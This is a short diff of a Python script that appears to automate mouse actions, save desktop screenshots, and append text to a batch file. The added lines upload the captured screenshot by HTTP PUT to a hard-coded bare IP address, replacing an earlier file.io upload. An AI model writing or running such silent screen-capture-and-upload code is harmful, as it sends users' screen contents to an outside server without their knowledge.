@@ -46,11 +46,10 @@ for x, y, duration in actions:
 time.sleep(2)
 im1 = pag.screenshot()
 im2 = pag.screenshot(r'C:\Users\Public\Desktop\my_screenshot.png')
-files = {'file': open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb')}
-r = requests.Request('POST', 'https://file.io', files=files)
-encoded_bytes = base64.b64encode(open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb'))
-print(encoded_bytes)
-print(r.json)
+files = open(r'C:\Users\Public\Desktop\my_screenshot.png', 'rb')
+r = requests.put('http://18.228.80.130/test.png', data=files)
+
+print(r.content)
 
 def save_echo_to_batch(file_path, echo_text):
     with open(file_path, 'a') as file:
